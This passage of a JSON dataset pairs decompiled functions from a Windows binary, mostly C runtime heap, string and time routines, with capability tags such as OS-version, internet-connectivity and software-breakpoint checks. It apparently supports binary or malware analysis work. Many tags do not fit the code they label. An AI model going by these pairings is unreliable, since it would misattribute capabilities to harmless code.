((uVar3 < 0x41) || (0x5a < uVar3)) {\n                if ((0x60 < uVar3) && (uVar3 < 0x7b)) {\n                    *(uVar3 + 0x4527e1) = *(uVar3 + 0x4527e1) | 0x20;\n                    cVar5 = uVar3 + -0x20;\n                    goto code_r0x0040bf62;\n                }\n                *(uVar3 + 0x452900) = 0;\n            }\n            else {\n                *(uVar3 + 0x4527e1) = *(uVar3 + 0x4527e1) | 0x10;\n                cVar5 = uVar3 + ' ';\ncode_r0x0040bf62:\n                *(uVar3 + 0x452900) = cVar5;\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < 0x100);\n    }\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 1850
    },
    "0040c008": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c008(int32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t extraout_ECX;\n    uint extraout_ECX_00;\n    int32_t iVar5;\n    uint8_t *puVar6;\n    uint8_t *puVar7;\n    uint *puVar8;\n    uint32_t var_1ch;\n    uint32_t lpCPInfo;\n    uint var_12h;\n    uint var_4h;\n    \n    var_4h = *0x44e0fc;\n    if (arg_8h != 0) {\n        iVar5 = 0;\n        uVar3 = 0;\ncode_r0x0040c02a:\n        if (*(uVar3 + 0x44e108) != arg_8h) goto code_r0x0040c032;\n        puVar8 = 0x4527e0;\n        for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar8 = 0;\n            puVar8 = puVar8 + 1;\n        }\n        var_1ch = 0;\n        *puVar8 = 0;\n        puVar6 = iVar5 * 0x30 + 0x44e118;\n        do {\n            uVar2 = *puVar6;\n            puVar7 = puVar6;\n            while ((uVar2 != 0 && (uVar1 = puVar7[1],  uVar1 != 0))) {\n                uVar3 = uVar2;\n                if (uVar3 <= uVar1) {\n                    uVar2 = *(var_1ch + 0x44e100);\n                    do {\n                        *(uVar3 + 0x4527e1) = *(uVar3 + 0x4527e1) | uVar2;\n                        uVar3 = uVar3 + 1;\n                    } while (uVar3 <= uVar1);\n                }\n                puVar7 = puVar7 + 2;\n                uVar2 = *puVar7;\n            }\n            var_1ch = var_1ch + 1;\n            puVar6 = puVar6 + 8;\n        } while (var_1ch < 4);\n        *0x4528e4 = arg_8h;\n        *0x4527c4 = 1;\n        *0x4527bc = fcn.0040bdb5();\n        *0x4528f0 = *(extraout_ECX + 0x44e10c);\n        *0x4528f4 = *(extraout_ECX + 0x44e110);\n        *0x4528f8 = *(extraout_ECX + 0x44e114);\n        goto code_r0x0040c17f;\n    }\ncode_r0x0040c17a:\n    fcn.0040bde4();\ncode_r0x0040c17f:\n    fcn.0040be0d();\ncode_r0x0040c18b:\n    fcn.0040b5c2();\n    return;\ncode_r0x0040c032:\n    uVar3 = uVar3 + 0x30;\n    iVar5 = iVar5 + 1;\n    if (0xef < uVar3) goto code_r0x0040c03d;\n    goto code_r0x0040c02a;\ncode_r0x0040c03d:\n    iVar5 = (*_sym.imp.KERNEL32.dll_GetCPInfo)(arg_8h, &lpCPInfo);\n    if (iVar5 != 1) {\n        if (*0x451014 == 0) goto code_r0x0040c18b;\n        goto code_r0x0040c17a;\n    }\n    puVar8 = 0x4527e0;\n    for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    *puVar8 = 0;\n    *0x4528e4 = arg_8h;\n    *0x4527bc = 0;\n    if (lpCPInfo < 2) {\n        *0x4527c4 = 0;\n    }\n    else {\n        if (var_12h != '\\0') {\n            puVar6 = &var_12h + 1;\n            do {\n                uVar2 = *puVar6;\n                if (uVar2 == 0) break;\n                for (uVar3 = puVar6[-1]; uVar3 <= uVar2; uVar3 = uVar3 + 1) {\n                    *(uVar3 + 0x4527e1) = *(uVar3 + 0x4527e1) | 4;\n                }\n                puVar7 = puVar6 + 1;\n                puVar6 = puVar6 + 2;\n            } while (*puVar7 != 0);\n        }\n        uVar3 = 1;\n        do {\n            *(uVar3 + 0x4527e1) = *(uVar3 + 0x4527e1) | 8;\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < 0xff);\n        *0x4527bc = fcn.0040bdb5();\n        *0x4527c4 = extraout_ECX_00;\n    }\n    *0x4528f0 = 0;\n    *0x4528f4 = 0;\n    *0x4528f8 = 0;\n    goto code_r0x0040c17f;\n}\n",
        "token_count": 1295
    },
    "0040c306": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.0040c306(uint32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_retaddr;\n    uint in_stack_00000008;\n    uint in_stack_0000000c;\n    uint in_stack_00000010;\n    uint32_t var_4h;\n    \n    uVar1 = arg_8h;\n    if (arg_8h < 0x100) {\n        uVar3 = fcn.0040fdd0(arg_8h);\n    }\n    else {\n        var_4h = 0;\n        iVar2 = fcn.0040eadd();\n        iVar2 = *(iVar2 + 0x60);\n        if (iVar2 != *0x4527c0) {\n            iVar2 = fcn.0040bf99();\n        }\n        arg_8h = CONCAT13(uVar1, CONCAT12(uVar1 >> 8, arg_8h));\n        if ((((*(iVar2 + 8) != 0) &&\n             (iVar2 = fcn.0041146b(1, &arg_8h + 2, 2, &var_4h, *(iVar2 + 4), *(iVar2 + 0xc), 1, unaff_EBX, var_4h, \n                                   unaff_EBP, unaff_retaddr, arg_8h, in_stack_00000008, in_stack_0000000c, \n                                   in_stack_00000010),  iVar2 != 0)) && (var_4h._2_2_ == 0)) && ((var_4h & 8) != 0)) {\n            return 1;\n        }\n        uVar3 = 0;\n    }\n    return uVar3;\n}\n",
        "token_count": 430
    },
    "0040c38a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t * __cdecl fcn.0040c38a(uint32_t *arg_8h, uint32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t *puVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    \n    iVar3 = fcn.0040eadd();\n    iVar3 = *(iVar3 + 0x60);\n    if (iVar3 != *0x4527c0) {\n        iVar3 = fcn.0040bf99();\n    }\n    if (*(iVar3 + 8) == 0) {\n        uVar7 = arg_8h & 3;\n        while (uVar7 != 0) {\n            if (*arg_8h == arg_ch) {\n                return arg_8h;\n            }\n            if (*arg_8h == 0) {\n                return NULL;\n            }\n            uVar7 = arg_8h + 1 & 3;\n            arg_8h = arg_8h + 1;\n        }\n        while( true ) {\n            while( true ) {\n                uVar7 = *arg_8h;\n                uVar6 = uVar7 ^ CONCAT22(CONCAT11(arg_ch, arg_ch), CONCAT11(arg_ch, arg_ch));\n                uVar4 = uVar7 ^ 0xffffffff ^ uVar7 + 0x7efefeff;\n                puVar5 = arg_8h + 1;\n                if (((uVar6 ^ 0xffffffff ^ uVar6 + 0x7efefeff) & 0x81010100) != 0) break;\n                arg_8h = puVar5;\n                if ((uVar4 & 0x81010100) != 0) {\n                    if ((uVar4 & 0x1010100) != 0) {\n                        return NULL;\n                    }\n                    if ((uVar7 + 0x7efefeff & 0x80000000) == 0) {\n                        return NULL;\n                    }\n                }\n            }\n            uVar7 = *arg_8h;\n            if (uVar7 == arg_ch) {\n                return arg_8h;\n            }\n            if (uVar7 == 0) {\n                return NULL;\n            }\n            uVar2 = uVar7 >> 8;\n            if (uVar2 == arg_ch) {\n                return arg_8h + 1;\n            }\n            if (uVar2 == 0) break;\n            uVar2 = uVar7 >> 0x10;\n            if (uVar2 == arg_ch) {\n                return arg_8h + 2;\n            }\n            if (uVar2 == 0) {\n                return NULL;\n            }\n            uVar2 = uVar7 >> 0x18;\n            if (uVar2 == arg_ch) {\n                return arg_8h + 3;\n            }\n            arg_8h = puVar5;\n            if (uVar2 == 0) {\n                return NULL;\n            }\n        }\n        return NULL;\n    }\n    while( true ) {\n        uVar2 = *arg_8h;\n        uVar7 = uVar2;\n        if (uVar2 == 0) break;\n        if ((*(uVar7 + 0x1d + iVar3) & 4) == 0) {\n            puVar5 = arg_8h;\n            if (arg_ch == uVar7) break;\n        }\n        else {\n            uVar1 = *(arg_8h + 1);\n            if (uVar1 == 0) {\n                return NULL;\n            }\n            puVar5 = arg_8h + 1;\n            if (arg_ch == CONCAT11(uVar2, uVar1)) {\n                return arg_8h;\n            }\n        }\n        arg_8h = puVar5 + 1;\n    }\n    return ~-(arg_ch != uVar7) & arg_8h;\n}\n",
        "token_count": 885
    },
    "0040c405": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nvoid __cdecl fcn.0040c405(uint arg_8h, uint arg_ch)\n\n{\n    int32_t arg_ch_00;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    uint32_t arg_10h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040bc40(0x443308, 0x14);\n    arg_ch_00 = *(unaff_EBP + 8);\n    if (arg_ch_00 == 0) {\n        fcn.00409f36(*(unaff_EBP + 0xc));\n    }\n    else {\n        arg_10h = *(unaff_EBP + 0xc);\n        if (arg_10h == 0) {\n            fcn.00409f48(arg_ch_00);\n        }\n        else if (*0x4527a8 == 3) {\n            do {\n                *(unaff_EBP + -0x1c) = 0;\n                if (arg_10h < 0xffffffe1) {\n                    fcn.0040d40a(4);\n                    *(unaff_EBP + -4) = 0;\n                    iVar1 = fcn.0040d4ee(arg_ch_00);\n                    *(unaff_EBP + -0x20) = iVar1;\n                    if (iVar1 != 0) {\n                        if (arg_10h <= *0x452794) {\n                            iVar1 = fcn.0040d9ee(iVar1, arg_ch_00, arg_10h);\n                            if (iVar1 == 0) {\n                                iVar1 = fcn.0040dccd(arg_10h);\n                                *(unaff_EBP + -0x1c) = iVar1;\n                                if (iVar1 != 0) {\n                                    uVar2 = *(arg_ch_00 + -4) - 1;\n                                    *(unaff_EBP + -0x24) = uVar2;\n                                    if (arg_10h <= uVar2) {\n                                        uVar2 = arg_10h;\n                                    }\n                                    fcn.0040b7b0(*(unaff_EBP + -0x1c), arg_ch_00, uVar2);\n                                    uVar3 = fcn.0040d4ee(arg_ch_00);\n                                    *(unaff_EBP + -0x20) = uVar3;\n                                    fcn.0040d519(uVar3, arg_ch_00);\n                                }\n                            }\n                            else {\n                                *(unaff_EBP + -0x1c) = arg_ch_00;\n                            }\n                        }\n                        if (*(unaff_EBP + -0x1c) == 0) {\n                            if (arg_10h == 0) {\n                                arg_10h = 1;\n                                *(unaff_EBP + 0xc) = 1;\n                            }\n                            arg_10h = arg_10h + 0xf & 0xfffffff0;\n                            *(unaff_EBP + 0xc) = arg_10h;\n                            iVar1 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x4527a4, 0, arg_10h);\n                            *(unaff_EBP + -0x1c) = iVar1;\n                            if (iVar1 != 0) {\n                                uVar2 = *(arg_ch_00 + -4) - 1;\n                                *(unaff_EBP + -0x24) = uVar2;\n                                if (arg_10h <= uVar2) {\n                                    uVar2 = arg_10h;\n                                }\n                                fcn.0040b7b0(*(unaff_EBP + -0x1c), arg_ch_00, uVar2);\n                                fcn.0040d519(*(unaff_EBP + -0x20), arg_ch_00);\n                            }\n                        }\n                    }\n                    *(unaff_EBP + -4) = 0xffffffff;\n                    fcn.0040c56d();\n                    if (*(unaff_EBP + -0x20) == 0) {\n                        if (arg_10h == 0) {\n                            arg_10h = 1;\n                        }\n                        arg_10h = arg_10h + 0xf & 0xfffffff0;\n                        *(unaff_EBP + 0xc) = arg_10h;\n                        uVar3 = (*_sym.imp.KERNEL32.dll_HeapReAlloc)(*0x4527a4, 0, arg_ch_00, arg_10h);\n                        *(unaff_EBP + -0x1c) = uVar3;\n                    }\n                }\n            } while (((*(unaff_EBP + -0x1c) == 0) && (*0x4511bc != 0)) && (iVar1 = fcn.0040dfc9(arg_10h),  iVar1 != 0));\n        }\n        else {\n            do {\n                iVar1 = 0;\n                if (arg_10h < 0xffffffe1) {\n                    if (arg_10h == 0) {\n                        arg_10h = 1;\n                    }\n                    iVar1 = (*_sym.imp.KERNEL32.dll_HeapReAlloc)(*0x4527a4, 0, arg_ch_00, arg_10h);\n                }\n            } while (((iVar1 == 0) && (*0x4511bc != 0)) && (iVar1 = fcn.0040dfc9(arg_10h),  iVar1 != 0));\n        }\n    }\n    fcn.0040bc7b();\n    return;\n}\n",
        "token_count": 1279
    },
    "0040c688": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040c688(uint *arg_8h, uint8_t *arg_ch)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    uint *puVar3;\n    uint8_t uVar4;\n    uint16_t uVar5;\n    int32_t iVar6;\n    uint16_t uVar7;\n    uint8_t *puVar8;\n    bool bVar9;\n    \n    iVar6 = fcn.0040eadd();\n    iVar6 = *(iVar6 + 0x60);\n    if (iVar6 != *0x4527c0) {\n        iVar6 = fcn.0040bf99();\n    }\n    if (*(iVar6 + 8) != 0) {\n        while( true ) {\n            uVar4 = *arg_8h;\n            uVar5 = uVar4;\n            puVar3 = arg_8h + 1;\n            if ((*(uVar4 + 0x1d + iVar6) & 4) != 0) {\n                if (*puVar3 == 0) {\n                    uVar5 = 0;\n                }\n                else {\n                    uVar5 = CONCAT11(uVar4, *puVar3);\n                    puVar3 = arg_8h + 2;\n                }\n            }\n            arg_8h = puVar3;\n            uVar4 = *arg_ch;\n            uVar7 = uVar4;\n            puVar8 = arg_ch + 1;\n            if ((*(uVar4 + 0x1d + iVar6) & 4) != 0) {\n                uVar1 = *puVar8;\n                if (uVar1 == 0) {\n                    uVar7 = 0;\n                }\n                else {\n                    puVar8 = arg_ch + 2;\n                    uVar7 = CONCAT11(uVar4, uVar1);\n                }\n            }\n            if (uVar7 != uVar5) break;\n            arg_ch = puVar8;\n            if (uVar5 == 0) {\n                return 0;\n            }\n        }\n        return (-(uVar7 < uVar5) & 2) - 1;\n    }\n    if ((arg_8h & 3) != 0) {\n        if ((arg_8h & 1) != 0) {\n            uVar4 = *arg_8h;\n            arg_8h = arg_8h + 1;\n            bVar9 = uVar4 < *arg_ch;\n            if (uVar4 != *arg_ch) goto code_r0x0040ef84;\n            arg_ch = arg_ch + 1;\n            if (uVar4 == 0) {\n                return 0;\n            }\n            if ((arg_8h & 2) == 0) goto code_r0x0040ef50;\n        }\n        uVar5 = *arg_8h;\n        arg_8h = arg_8h + 2;\n        uVar4 = uVar5;\n        bVar9 = uVar4 < *arg_ch;\n        if (uVar4 != *arg_ch) goto code_r0x0040ef84;\n        if (uVar4 == 0) {\n            return 0;\n        }\n        uVar4 = uVar5 >> 8;\n        bVar9 = uVar4 < arg_ch[1];\n        if (uVar4 != arg_ch[1]) goto code_r0x0040ef84;\n        if (uVar4 == 0) {\n            return 0;\n        }\n        arg_ch = arg_ch + 2;\n    }\ncode_r0x0040ef50:\n    while( true ) {\n        uVar2 = *arg_8h;\n        uVar4 = uVar2;\n        bVar9 = uVar4 < *arg_ch;\n        if (uVar4 != *arg_ch) break;\n        if (uVar4 == 0) {\n            return 0;\n        }\n        uVar4 = uVar2 >> 8;\n        bVar9 = uVar4 < arg_ch[1];\n        if (uVar4 != arg_ch[1]) break;\n        if (uVar4 == 0) {\n            return 0;\n        }\n        uVar4 = uVar2 >> 0x10;\n        bVar9 = uVar4 < arg_ch[2];\n        if (uVar4 != arg_ch[2]) break;\n        if (uVar4 == 0) {\n            return 0;\n        }\n        uVar4 = uVar2 >> 0x18;\n        bVar9 = uVar4 < arg_ch[3];\n        if (uVar4 != arg_ch[3]) break;\n        arg_ch = arg_ch + 4;\n        arg_8h = arg_8h + 1;\n        if (uVar4 == 0) {\n            return 0;\n        }\n    }\ncode_r0x0040ef84:\n    return bVar9 * -2 + 1;\n}\n",
        "token_count": 1093
    },
    "0040c9f1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040c9f1(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t arg_8h_00;\n    uint uVar1;\n    int32_t unaff_EBP;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040bc40(0x443340, 0x10);\n    uVar2 = *(unaff_EBP + 8) * *(unaff_EBP + 0xc);\n    *(unaff_EBP + -0x20) = uVar2;\n    if (uVar2 == 0) {\n        uVar2 = 1;\n    }\n    do {\n        iVar3 = 0;\n        *(unaff_EBP + -0x1c) = 0;\n        if (uVar2 < 0xffffffe1) {\n            if (*0x4527a8 == 3) {\n                uVar2 = uVar2 + 0xf & 0xfffffff0;\n                *(unaff_EBP + 0xc) = uVar2;\n                arg_8h_00 = *(unaff_EBP + -0x20);\n                if (*0x452794 < arg_8h_00) goto code_r0x0040ca66;\n                fcn.0040d40a(4);\n                *(unaff_EBP + -4) = 0;\n                uVar1 = fcn.0040dccd(arg_8h_00);\n                *(unaff_EBP + -0x1c) = uVar1;\n                *(unaff_EBP + -4) = 0xffffffff;\n                fcn.0040ca9b();\n                iVar3 = *(unaff_EBP + -0x1c);\n                if (iVar3 != 0) {\n                    fcn.0040bbe0(iVar3, 0, *(unaff_EBP + -0x20));\n                    goto code_r0x0040ca66;\n                }\n            }\n            else {\ncode_r0x0040ca66:\n                if (iVar3 != 0) {\ncode_r0x0040caa6:\n                    fcn.0040bc7b();\n                    return;\n                }\n            }\n            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x4527a4, 8, uVar2);\n        }\n        if (((iVar3 != 0) || (*0x4511bc == 0)) || (iVar3 = fcn.0040dfc9(uVar2),  iVar3 == 0)) goto code_r0x0040caa6;\n    } while( true );\n}\n",
        "token_count": 615
    },
    "0040cb33": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint64_t __cdecl fcn.0040cb33(int32_t arg_8h)\n\n{\n    uint64_t uVar1;\n    int32_t *in_EAX;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    bool bVar6;\n    int64_t iVar7;\n    ulong uVar8;\n    uint var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_ch = in_EAX[5];\n    var_8h = var_ch >> 0x1f;\n    if ((var_8h < 0) ||\n       ((((-1 < var_ch || var_8h < 0 && (var_ch < 0x45)) || (0 < var_8h)) || ((-1 < var_8h && (0x44c < var_ch)))))) {\ncode_r0x0040cd79:\n        _var_ch = -1;\n    }\n    else {\n        iVar4 = in_EAX[4];\n        if ((iVar4 < 0) || (0xb < iVar4)) {\n            uVar2 = iVar4 / 0xc;\n            iVar4 = iVar4 % 0xc;\n            bVar6 = CARRY4(var_ch, uVar2);\n            var_ch = var_ch + uVar2;\n            in_EAX[4] = iVar4;\n            var_8h = var_8h + (uVar2 >> 0x1f) + bVar6;\n            if (iVar4 < 0) {\n                bVar6 = var_ch != 0;\n                var_ch = var_ch - 1;\n                in_EAX[4] = iVar4 + 0xc;\n                var_8h = var_8h + -1 + bVar6;\n            }\n            if ((((var_8h < 0) || ((var_8h < 1 && (var_ch < 0x45)))) || (0 < var_8h)) ||\n               ((-1 < var_8h && (0x44c < var_ch)))) goto code_r0x0040cd79;\n        }\n        iVar4 = in_EAX[4];\n        var_14h = *(iVar4 * 4 + 0x44e77c);\n        var_10h = var_14h >> 0x1f;\n        iVar7 = fcn.004135b0(var_ch, var_8h, 4, 0);\n        if ((iVar7 == 0) && (uVar2 = var_ch,  iVar7 = fcn.004135b0(var_ch, var_8h, 100, 0),  iVar7 != 0)) {\ncode_r0x0040cc28:\n            if (1 < iVar4) {\n                bVar6 = 0xfffffffe < var_14h;\n                var_14h = var_14h + 1;\n                var_10h = var_10h + bVar6;\n            }\n        }\n        else {\n            uVar2 = var_ch + 0x76c;\n            iVar7 = fcn.004135b0();\n            if (iVar7 == 0) goto code_r0x0040cc28;\n        }\n        iVar5 = var_ch - 1;\n        iVar4 = var_8h - (var_ch == 0);\n        iVar7 = fcn.0040d140(var_ch + 299, var_8h + (0xfffffed4 < var_ch), 400, 0, uVar2);\n        uVar2 = iVar7 + in_EAX[3];\n        var_4h = iVar7 + in_EAX[3] >> 0x20;\n        uVar8 = fcn.0040d140(iVar5, iVar4, 100, 0);\n        var_4h = (var_4h - (uVar8 >> 0x20)) - (uVar2 < uVar8);\n        iVar7 = fcn.0040d140(iVar5, iVar4, 4, 0);\n        uVar1 = iVar7 + CONCAT44(var_4h, uVar2 - uVar8);\n        var_4h = uVar1 >> 0x20;\n        iVar7 = fcn.0040bba0(var_ch, var_8h, 0x16d, 0);\n        iVar7 = iVar7 + (uVar1 & 0xffffffff | var_4h << 0x20) + CONCAT44(var_10h, var_14h);\n        uVar2 = iVar7;\n        var_4h = uVar2 - 0x63df;\n        iVar7 = fcn.0040bba0(var_4h, (iVar7 >> 0x20) - (uVar2 < 0x63df), 0x18, 0);\n        iVar7 = fcn.0040bba0(iVar7 + in_EAX[2], 0x3c, 0);\n        _var_ch = fcn.0040bba0(iVar7 + in_EAX[1], 0x3c, 0);\n        _var_ch = _var_ch + *in_EAX;\n        if (arg_8h == 0) {\n            piVar3 = fcn.00412d18(&var_ch);\ncode_r0x0040cd65:\n            if (piVar3 == NULL) goto code_r0x0040cd79;\n        }\n        else {\n            fcn.00413524();\n            _var_ch = _var_ch + *0x44e698;\n            piVar3 = fcn.0040cd90(&var_ch);\n            if (piVar3 == NULL) goto code_r0x0040cd79;\n            if ((0 < in_EAX[8]) || ((in_EAX[8] < 0 && (0 < piVar3[8])))) {\n                _var_ch = _var_ch + *0x44e6a0;\n                piVar3 = fcn.0040cd90(&var_ch);\n                goto code_r0x0040cd65;\n            }\n        }\n        for (iVar4 = 9; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *in_EAX = *piVar3;\n            piVar3 = piVar3 + 1;\n            in_EAX = in_EAX + 1;\n        }\n    }\n    return _var_ch;\n}\n",
        "token_count": 1463
    },
    "0040cf9e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040cf9e(uint lpMem, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t unaff_EBP;\n    uint32_t arg_10h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040bc40(0x443350, 0x10);\n    arg_10h = *(unaff_EBP + 0xc);\n    if (arg_10h < 0xffffffe1) {\n        if (*0x4527a8 == 3) {\n            fcn.0040d40a(4);\n            *(unaff_EBP + -4) = 0;\n            uVar2 = *(unaff_EBP + 8);\n            iVar1 = fcn.0040d4ee(uVar2);\n            *(unaff_EBP + -0x20) = iVar1;\n            if (((iVar1 != 0) && (*(unaff_EBP + -0x1c) = 0,  arg_10h <= *0x452794)) &&\n               (iVar1 = fcn.0040d9ee(iVar1, uVar2, arg_10h),  iVar1 != 0)) {\n                *(unaff_EBP + -0x1c) = uVar2;\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.0040d01c();\n            if (*(unaff_EBP + -0x20) != 0) goto code_r0x0040d042;\n            if (arg_10h == 0) {\n                arg_10h = 1;\n            }\n            arg_10h = arg_10h + 0xf & 0xfffffff0;\n        }\n        else if (arg_10h == 0) {\n            arg_10h = 1;\n        }\n        uVar2 = (*_sym.imp.KERNEL32.dll_HeapReAlloc)(*0x4527a4, 0x10, *(unaff_EBP + 8), arg_10h);\n        *(unaff_EBP + -0x1c) = uVar2;\n    }\ncode_r0x0040d042:\n    fcn.0040bc7b();\n    return;\n}\n",
        "token_count": 528
    },
    "0040d048": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040d048(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040bc40(0x443360, 0x10);\n    if (*0x4527a8 == 3) {\n        fcn.0040d40a(4);\n        *(unaff_EBP + -4) = 0;\n        iVar1 = *(unaff_EBP + 8);\n        iVar2 = fcn.0040d4ee(iVar1);\n        *(unaff_EBP + -0x20) = iVar2;\n        if (iVar2 != 0) {\n            *(unaff_EBP + -0x1c) = *(iVar1 + -4) + -9;\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        fcn.0040d0b5();\n        if (*(unaff_EBP + -0x20) != 0) goto code_r0x0040d0aa;\n    }\n    (*_sym.imp.KERNEL32.dll_HeapSize)(*0x4527a4, 0, *(unaff_EBP + 8));\ncode_r0x0040d0aa:\n    fcn.0040bc7b();\n    return;\n}\n",
        "token_count": 332
    },
    "0040d234": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d234(uint arg_8h, uint arg_ch, uint noname_2, uint noname_3, uint arg_18h)\n\n{\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x20) == 0) {\n        fcn.0040bc8c(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + -0x1c), *(unaff_EBP + 0x18));\n    }\n    return;\n}\n",
        "token_count": 139
    },
    "0040d43b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.0040d43b(void)\n\n{\n    if ((*0x45101c == 2) && (4 < *0x451028)) {\n        return 1;\n    }\n    return 3;\n}\n",
        "token_count": 49
    },
    "0040d455": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint fcn.0040d455(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    *0x4527a4 = (*_sym.imp.KERNEL32.dll_HeapCreate)(param_1 == 0, 0x1000, 0);\n    if (*0x4527a4 == 0) {\n        return 0;\n    }\n    *0x4527a8 = fcn.0040d43b();\n    if ((*0x4527a8 == 3) && (iVar1 = fcn.0040d4a6(0x3f8),  iVar1 == 0)) {\n        (*_sym.imp.KERNEL32.dll_HeapDestroy)(*0x4527a4);\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 176
    },
    "0040d519": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
